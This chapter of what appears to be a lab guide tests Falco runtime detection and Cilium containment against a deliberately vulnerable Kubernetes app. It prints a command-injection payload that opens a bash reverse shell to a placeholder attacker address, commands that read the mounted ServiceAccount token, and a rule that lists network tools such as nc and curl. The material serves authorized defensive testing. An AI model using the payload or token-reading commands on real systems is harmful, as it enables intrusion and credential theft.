\chapter{Detection scenarios and rule design}
\label{ch:ch3}
\section{Scenario design}
The scenarios exercise distinct runtime behaviours: shell I/O redirection, credential
exposure, debugger evasion and execution of network tools. Execute them only against
the supplied vulnerable application in an authorized, isolated environment.
Detection and response are separate acceptance criteria: an alert alone does not
demonstrate quarantine, and a metadata patch alone does not demonstrate network deny.

\section{Command injection and reverse shell}
The application passes the form's \texttt{host} value into a shell command using
\texttt{subprocess.run(..., shell=True)}. A shell separator can therefore introduce
additional commands after the intended ping. This is a deliberate vulnerability,
not a recommended application pattern.

Prepare a controlled listener on TCP port 4444 in the isolated test environment.
The target's NodePort interface accepts the following payload, with the placeholder
replaced by that listener's address:
\begin{lstlisting}[language=bash]
127.0.0.1; bash -c 'bash -i >& /dev/tcp/<ATTACKER_IP>/4444 0>&1'
\end{lstlisting}
The relevant Falco rule is named exactly
\texttt{Redirect STDOUT/STDIN to Network Connection in Container}. The handler
matches the JSON rule name, not an abbreviated human-readable log message. Record
the actual event, including source, rule, pod name and namespace. Observe both
the handler result and Cilium enforcement before concluding that containment succeeded.
Application request timeouts or a closed listener are not evidence of quarantine.

\section{ServiceAccount credential exposure}
The target intentionally mounts a ServiceAccount token. Reading it demonstrates
credential exposure following code execution; it does not by itself grant additional
permissions beyond those assigned to that ServiceAccount.
\begin{lstlisting}[language=bash]
# Only in the controlled target; do not publish token contents.
cat /var/run/secrets/kubernetes.io/serviceaccount/token
cat /var/run/secrets/kubernetes.io/serviceaccount/namespace
\end{lstlisting}
The current project does not provide a dedicated token-read detection rule or include
such an event in the response allowlist. An alert caused by reading a different file,
such as \texttt{/etc/shadow}, must not be presented as proof of token-theft detection.
For a real workload that does not need API access, disable token automounting and
review its permissions. Keep this intentionally exposed target confined to the test environment.

\section{Ptrace debugger-evasion demonstration}
The supplied C program calls \texttt{ptrace(PTRACE\_TRACEME, ...)}. This provides a
small, inspectable input for the \texttt{PTRACE anti-debug attempt} detection rule.
The syscall may succeed or fail depending on runtime restrictions; record the return
value and the corresponding Falco event rather than assuming a successful trace.

Compile on Linux for the target container's architecture before transferring the binary:
\begin{lstlisting}[language=bash]
gcc -o material/payloads/ptrace material/payloads/ptrace.c
POD=$(kubectl -n default get pod -l app=vulnapp \
  -o jsonpath='{.items[0].metadata.name}')
kubectl -n default cp material/payloads/ptrace "$POD:/tmp/ptrace"
kubectl -n default exec "$POD" -- /tmp/ptrace
kubectl -n falco logs -l app.kubernetes.io/name=falco -c falco --tail=50
\end{lstlisting}
This direct execution tests syscall detection and the response path, not exploitation
through the web interface. Distinguishing those two entry points makes the validation
result easier to interpret and reproduce.

\section{Application-specific network-tool rule}
The committed custom rule restricts detection to the target image and execution of
specified network tools. Its condition is based on the process name, rather than
arbitrary substrings in a shell's command-line arguments:
\begin{lstlisting}[language=bash]
spawned_process and container
and container.image.repository = "vulnapp"
and proc.name in (wget, curl, ncat, nc, netcat)
\end{lstlisting}
The rule \texttt{Detect Network Tools in vulnapp} includes pod and namespace fields
in its output so that the handler can resolve the workload. The definitive rule and
forwarding configuration is in \texttt{material/falco/falco-values.example.yaml};
avoid maintaining a second divergent copy in Helm values.

To test the rule without downloading a payload, install the selected tool during
test preparation and execute its version command inside the target:
\begin{lstlisting}[language=bash]
# Preparation, before interpreting tool-execution alerts:
kubectl -n default exec deployment/vulnapp -- bash -c \
  'apt-get update -qq && apt-get install -y wget -qq'
# Detect execution, not proof of a completed file transfer:
kubectl -n default exec deployment/vulnapp -- wget --version
\end{lstlisting}
Inspect the exact custom-rule event, not merely a generic shell alert. Network-tool
execution is a signal of interest, not proof of malicious intent; legitimate maintenance
may trigger the same condition. If response is enabled, this test may quarantine the
selected replica. Prepare subsequent scenarios against a healthy target.

\section{Tuning and event identity}
Falco lists group values, macros group conditions and rules combine a condition with
output fields and severity. Exceptions should be narrowly based on observed legitimate
behaviour, not blanket suppression of the whole workload. Test exception cases alongside
the malicious and benign cases before enabling automated action.

The handler accepts syscall events with a permitted rule, namespace and workload.
Kubernetes metadata is the preferred identity source; a legacy container-name fallback
exists but must not substitute for checking the actual JSON produced by the deployment.
The allowlist excludes unrelated API-contact alerts, reducing response-loop risk.
The configured handler-image exception is a noise-control measure, not an authentication
mechanism or a general guarantee against feedback loops.
